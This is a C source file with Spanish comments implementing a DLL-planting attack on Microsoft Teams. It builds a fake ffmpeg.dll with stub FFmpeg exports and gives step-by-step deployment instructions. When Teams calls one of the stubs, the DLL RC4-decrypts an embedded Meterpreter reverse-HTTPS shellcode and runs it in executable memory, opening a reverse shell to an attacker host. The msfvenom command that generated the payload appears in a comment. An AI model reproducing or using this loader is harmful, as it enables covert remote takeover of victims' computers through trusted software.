/*
    Compilar como DLL y nombrar ffmpeg.dll
    gcc -shared dll-planting-tcp -o ffmpeg.dll

    Detener Microsoft Teams, copiar la dll en
    C:\Users\[usuario]\AppData\Local\Microsoft\Teams\current

    Volver a ejecutar Teams y esperar la shell reversa
*/

#include <stdio.h>
#include <windows.h>

void alert(char *msg) {
     MessageBoxA( NULL, msg, "Fatal error", MB_OK );
}
BOOL WINAPI av_buffer_create() { alert("av_buffer_create"); return 0; }
BOOL WINAPI av_buffer_get_opaque() { alert("av_buffer_get_opaque"); return 0; }
BOOL WINAPI av_dict_count() { alert("av_dict_count"); return 0; }
BOOL WINAPI av_dict_free() { alert("av_dict_free"); return 0; }
BOOL WINAPI av_dict_get() { alert("av_dict_get"); return 0; }
BOOL WINAPI av_dict_set() { alert("av_dict_set"); return 0; }
BOOL WINAPI av_force_cpu_flags() { alert("av_force_cpu_flags"); return 0; }
BOOL WINAPI av_frame_alloc() { alert("av_frame_alloc"); return 0; }
BOOL WINAPI av_frame_clone() { alert("av_frame_clone"); return 0; }
BOOL WINAPI av_frame_free() { alert("av_frame_free"); return 0; }
BOOL WINAPI av_frame_unref() { alert("av_frame_unref"); return 0; }
BOOL WINAPI av_free() { alert("av_free"); return 0; }
BOOL WINAPI av_get_bytes_per_sample() { alert("av_get_bytes_per_sample"); return 0; }
BOOL WINAPI av_image_check_size() { alert("av_image_check_size"); return 0; }
BOOL WINAPI av_init_packet() { alert("av_init_packet"); return 0; }
BOOL WINAPI av_log_set_level() { alert("av_log_set_level"); return 0; }
BOOL WINAPI av_malloc() { alert("av_malloc"); return 0; }
BOOL WINAPI av_max_alloc() { alert("av_max_alloc"); return 0; }
BOOL WINAPI av_new_packet() { alert("av_new_packet"); return 0; }
BOOL WINAPI av_packet_copy_props() { alert("av_packet_copy_props"); return 0; }
BOOL WINAPI av_packet_get_side_data() { alert("av_packet_get_side_data"); return 0; }
BOOL WINAPI av_packet_unref() { alert("av_packet_unref"); return 0; }
BOOL WINAPI av_rdft_calc() { alert("av_rdft_calc"); return 0; }
BOOL WINAPI av_rdft_end() { alert("av_rdft_end"); return 0; }
BOOL WINAPI av_rdft_init() { alert("av_rdft_init"); return 0; }
BOOL WINAPI av_read_frame() { alert("av_read_frame"); return 0; }
BOOL WINAPI av_rescale_q() { alert("av_rescale_q"); return 0; }
BOOL WINAPI av_samples_get_buffer_size() { alert("av_samples_get_buffer_size"); return 0; }
BOOL WINAPI av_seek_frame() { alert("av_seek_frame"); return 0; }
BOOL WINAPI av_strerror() { alert("av_strerror"); return 0; }
BOOL WINAPI avcodec_align_dimensions() { alert("avcodec_align_dimensions"); return 0; }
BOOL WINAPI avcodec_alloc_context3() { alert("avcodec_alloc_context3"); return 0; }
BOOL WINAPI avcodec_decode_video2() { alert("avcodec_decode_video2"); return 0; }
BOOL WINAPI avcodec_descriptor_get() { alert("avcodec_descriptor_get"); return 0; }
BOOL WINAPI avcodec_descriptor_next() { alert("avcodec_descriptor_next"); return 0; }
BOOL WINAPI avcodec_find_decoder() { alert("avcodec_find_decoder"); return 0; }
BOOL WINAPI avcodec_flush_buffers() { alert("avcodec_flush_buffers"); return 0; }
BOOL WINAPI avcodec_free_context() { alert("avcodec_free_context"); return 0; }
BOOL WINAPI avcodec_get_name() { alert("avcodec_get_name"); return 0; }
BOOL WINAPI avcodec_open2() { alert("avcodec_open2"); return 0; }
BOOL WINAPI avcodec_parameters_to_context() { alert("avcodec_parameters_to_context"); return 0; }
BOOL WINAPI avcodec_receive_frame() { alert("avcodec_receive_frame"); return 0; }
BOOL WINAPI avcodec_send_packet() { alert("avcodec_send_packet"); return 0; }
BOOL WINAPI avformat_alloc_context() { alert("avformat_alloc_context"); return 0; }
BOOL WINAPI avformat_close_input() { alert("avformat_close_input"); return 0; }
BOOL WINAPI avformat_find_stream_info() { alert("avformat_find_stream_info"); return 0; }
BOOL WINAPI avformat_free_context() { alert("avformat_free_context"); return 0; }
BOOL WINAPI avformat_open_input() { alert("avformat_open_input"); return 0; }
BOOL WINAPI avio_alloc_context() { alert("avio_alloc_context"); return 0; }
BOOL WINAPI avio_close() { alert("avio_close"); return 0; }


#define ARRAY_LENGTH	256

unsigned char s[ARRAY_LENGTH];
int rc4_i;
int rc4_j;

void swap(unsigned char *s1, unsigned char *s2)
{
	char temp = *s1;

	*s1 = *s2;
	*s2 = temp;
}


int InitRC4(void)
{
	int i;

	for(i=0 ; i< ARRAY_LENGTH; i++)
		s[i] = i;

	rc4_i = rc4_j = 0;

	return 1;
}

int DoKSA(unsigned char *key, int key_len)
{

	for(rc4_i = 0; rc4_i < ARRAY_LENGTH; rc4_i++)
	{
		rc4_j = (rc4_j + s[rc4_i] + key[rc4_i % key_len])% ARRAY_LENGTH;
		swap(&s[rc4_i], &s[rc4_j]);
	}
	
	rc4_i = rc4_j = 0;

}


char GetPRGAOutput(void)
{
	rc4_i = (rc4_i +1 ) % ARRAY_LENGTH;

	rc4_j = (rc4_j + s[rc4_i]) % ARRAY_LENGTH;

	swap(&s[rc4_i], &s[rc4_j]);

	return s[(s[rc4_i] + s[rc4_j]) % ARRAY_LENGTH];
}

int CSA() {
    int proceso = GetCurrentProcessId();

    HANDLE p = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, proceso);
    
    if (p == NULL) {
        MessageBoxA( NULL, "Error al obtener el manejador del proceso", "Fatal error", MB_OK );
        return 0;
    }

    //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.147.139 LPORT=443 HandlerSSLCert "/root/certificado.pem" StagerVerifySSLCert=true --encrypt rc4 --encrypt-key inc0d3 -f c
    unsigned char payload[] = 
                                "\x88\xa1\x26\x40\xb5\x38\xd1\xcc\xf0\x6f\x95\x33\x33\x24\x60"
                                "\x8e\x9c\xdf\xe8\x55\xb4\x62\x17\xe9\xf8\xfa\xde\xdd\x43\xe9"
                                "\x6a\x1a\x81\x59\x13\x21\xf4\x12\x0c\xb0\xa5\x3f\xf8\xd7\xb0"
                                "\x04\x22\x56\xbb\xba\x7f\xad\x63\xdc\x13\xfc\x34\x48\x6d\x98"
                                "\xf6\xca\xc0\xc0\xe6\xa2\x1b\x5b\xca\x8b\xf4\x78\x60\x73\x83"
                                "\x3b\xbf\x5f\xdf\xad\x74\x1f\x34\xed\x28\xad\x20\x9f\xbf\x79"
                                "\x6c\xb1\x78\x89\xd0\xb9\xe0\x24\xf5\xd9\xb6\xd5\x17\x3e\x5e"
                                "\xf1\xaf\x22\x3f\xbc\x39\x0e\xdd\xb4\x14\x14\x87\x05\xb3\xe3"
                                "\x1c\xdc\xf7\x3f\xc2\xd0\x5c\x8a\x73\xca\x4c\x68\xc0\x80\xe7"
                                "\x45\x11\x73\xe1\x6b\x52\x7d\xad\xfd\xe3\xae\x0a\x00\xe8\x1f"
                                "\x4b\x1f\x37\xab\x28\x15\x51\x88\x32\x79\x1c\x5b\x03\xd1\x5d"
                                "\x57\x88\x28\x20\x13\x09\xb1\xe8\xe4\x55\x63\xc9\x7b\x59\x68"
                                "\xf7\x31\x81\xa0\x67\xfb\xa8\x90\x77\xdc\x6a\x7c\x64\x5e\x2c"
                                "\x64\x3b\xfc\x4b\xde\x57\x16\xe0\xb1\xec\x5a\x03\x96\x87\x07"
                                "\xd9\x39\xae\x54\x71\x57\x62\x9f\xea\xe0\xdc\xd5\x63\x50\x20"
                                "\x5d\x88\xed\x0c\x4c\x60\x40\x31\xb0\x57\x87\xf8\x14\x0c\x89"
                                "\xd0\xdb\x01\x33\x74\xc0\x2d\x98\x89\x82\x51\xba\xe0\x6e\x56"
                                "\xbb\x15\x1c\xee\x43\xe6\xa6\x75\x74\x02\x46\x4c\x64\x21\xb3"
                                "\xcb\xcf\x30\xbc\x9a\xd4\xe9\x30\x50\xb0\xd5\xbd\x8f\x03\x56"
                                "\x24\x00\x61\x72\xee\xc7\x98\x86\x1e\xa8\xfe\x74\x25\x3c\xe4"
                                "\xb5\xdd\xba\x0e\x9e\x7e\x2a\x1a\xe5\xf2\x2b\x64\xf7\x1f\x2c"
                                "\x81\x1a\x2a\xce\xe7\xdd\xa8\xde\xe4\x0e\xc6\x92\xd4\x1f\x98"
                                "\x45\x4f\x84\x2d\x7e\x11\xca\xb2\xdf\xf5\xaa\x7b\x41\xa6\x99"
                                "\xa7\x58\x5d\x86\x31\x40\x7e\x7e\x3d\x37\xfd\x0b\xc8\x09\x7a"
                                "\x22\xd1\x46\x21\xe0\xd0\x59\xf2\xd4\xfa\x8f\x55\x0a\xc4\xd0"
                                "\x57\x90\xd2\xe8\xbb\x66\x12\xcb\x91\x71\x26\x9c\xf3\x41\xdb"
                                "\x30\x4d\xa9\x34\x8e\x8f\xf1\xa6\x4d\x8a\xeb\x70\xd0\x95\x5e"
                                "\x1e\x44\x38\x64\x08\x62\xb9\xeb\xff\xc9\x8e\x77\x97\x71\xec"
                                "\xd9\xef\x26\x38\xb4\x5e\x95\x39\x7c\xe5\x78\x80\xe8\xbc\x0e"
                                "\xc5\x0a\x4f\xda\xe9\xc2\xcf\x15\xc7\x1b\xe5\x6c\xc6\x01\xe7"
                                "\x3e\x74\x31\x8c\x65\x71\xe8\x97\x6b\x82\x50\x96\x91\x17\x54"
                                "\x79\x0b\xe0\x41\xdf\x3e\xc8\xff\x00\xe9\x5b\x58\x82\x01\xe8"
                                "\x47\x8d\xb5\x1b\x18\x2e\x39\xaf\x37\x6e\x89\x1a\x72\x51\x9e"
                                "\x73\xdd\xcf\xe9\x0d\x1d\xb4\xd6\x1c\xc6\x52\xb8\xe8\x6f\x77"
                                "\xb1\x97\x95\xba\x4c\x3c\x68\xb3\xb8\x09\x16\xa1\xd2\xb3\x02"
                                "\xc4\xa0\x60\xce\x5e\x04\x8e\xeb\x27\x32\x06\xa1\x57\x04\xed"
                                "\x05\x68\x11\xcf\x6a\x48\x5e\xe8\x65\x88\xe1\xda\x86\x80\x9c"
                                "\xf3\x99\x3e\xeb\x2a\xb6\x08\xca\xc8\x32\x24\x7b\x86\xff\x1a"
                                "\xbb\x83\xe1\x48\xaf\xd9\x01\x7e\x1c\xa5\xea\x77\x17\x20\x00"
                                "\x81\xdd\xed\x80\x0f\xff\x84\x28\x8a\x38\x45\xa6\x11\xf6\x1b"
                                "\xd5\x25\xfc\x10\xc5\x70\xa6\x92\xc7\x63\x8a\x96\x17\x18\x5f"
                                "\x4e\x34\xc1\x42\xec\x28\x42\x5f\xc0\xb1\x93\xe4\x43\xaf\x69"
                                "\x21\x95\xab\x79\x79\xb0\xfb\x33\xc3\x1c\x7f\x3e\x85\xd4\xe7"
                                "\x75\x6d\x1b\x16\x66\x85\xb6\x46\x9f\x94\x37\x04\xee\xda\xa5"
                                "\x48\x81\x72\x63\xe5\x37\xc9\x26\x9f\x3f\x27\xc1\x6a\xba\x88"
                                "\x02\xd8\x05\x65\xb0\x9c\x33\xaa\x1f\x2c\x47\xc6\x06\x17\x3c"
                                "\xdc\xc4\x42\x0d\x14\xb4\xc7\xde\x26\x1c\x44\x3d\x00\x22\x91"
                                "\x7d\xa6\x82\x35\xde";


    unsigned char keystream_byte;

    InitRC4();
	
	DoKSA("inc0d3", 6);   

    LPVOID memoria = VirtualAllocEx(p, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
    if (memoria == NULL) {
        MessageBoxA( NULL, "Error al obtener memoria", "Fatal error", MB_OK );
        return 0;
    }   

    for(size_t i = 0, len = sizeof(payload) - 1; i < len; i++) {
        keystream_byte = GetPRGAOutput();
        payload[i] = payload[i] ^ keystream_byte;        
    }
    
    BOOL result = WriteProcessMemory(p, memoria, payload, sizeof(payload), NULL);

    if (result == FALSE) {
        MessageBoxA( NULL, "Error al escribir la shellcode", "Fatal error", MB_OK );
        return 0;
    }  

    ((void(*)())memoria)();  
   
    /*
    HANDLE remoteThread = CreateRemoteThread(p, NULL, 0, (LPTHREAD_START_ROUTINE)memoria, NULL, 0, NULL);

    if (remoteThread == NULL) {
        MessageBoxA( NULL, "Error al crear el hilo", "Fatal error", MB_OK );
        return 0;
    }    

    WaitForSingleObject(remoteThread, INFINITE);                      

    */

    return 0;
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL,  DWORD fdwReason,  LPVOID lpReserved ){
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
           		
            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE; 
}

BOOL WINAPI av_get_cpu_flags() { 

    CSA();

}